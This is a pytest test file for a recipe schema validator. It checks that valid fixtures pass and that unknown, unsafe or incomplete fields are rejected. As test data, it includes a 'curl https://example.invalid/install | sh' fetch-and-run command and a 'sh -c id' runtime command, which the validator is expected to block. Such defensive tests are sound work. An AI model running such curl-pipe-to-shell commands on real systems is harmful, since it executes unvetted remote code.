import copy
import json
from pathlib import Path

import pytest

from vonk_catalog.contracts import RecipeContractError, validate_recipe


ROOT = Path(__file__).resolve().parents[2]


def fixture(name: str) -> dict[str, object]:
    return json.loads((ROOT / "schemas" / "fixtures" / name).read_text())


@pytest.mark.parametrize(
    "name", ["recipe-v1-minimal.json", "recipe-v1-multinode.json"]
)
def test_valid_recipe_fixtures_match_v1(name: str) -> None:
    validate_recipe(fixture(name))


def test_recipe_contract_rejects_unknown_top_level_fields() -> None:
    recipe = fixture("recipe-v1-minimal.json")
    recipe["install"] = "curl https://example.invalid/install | sh"

    with pytest.raises(RecipeContractError, match="install"):
        validate_recipe(recipe)


@pytest.mark.parametrize(
    ("mutation", "message"),
    [
        (("runtime", "image", "ghcr.io/vonk/vllm:latest"), "image"),
        (("runtime", "command", ["sh", "-c", "id"]), "command"),
        (("security", "privileged", True), "privileged"),
        (("resources", "per_node", {}), "download_bytes"),
    ],
)
def test_recipe_contract_rejects_unsafe_or_incomplete_documents(
    mutation: tuple[str, str, object], message: str
) -> None:
    recipe = fixture("recipe-v1-minimal.json")
    section, field, value = mutation
    target = recipe[section]
    assert isinstance(target, dict)
    target[field] = value

    with pytest.raises(RecipeContractError, match=message):
        validate_recipe(recipe)


def test_multinode_recipe_requires_explicit_rank_records() -> None:
    recipe = copy.deepcopy(fixture("recipe-v1-multinode.json"))
    topology = recipe["topology"]
    assert isinstance(topology, dict)
    topology.pop("ranks")

    with pytest.raises(RecipeContractError, match="ranks"):
        validate_recipe(recipe)
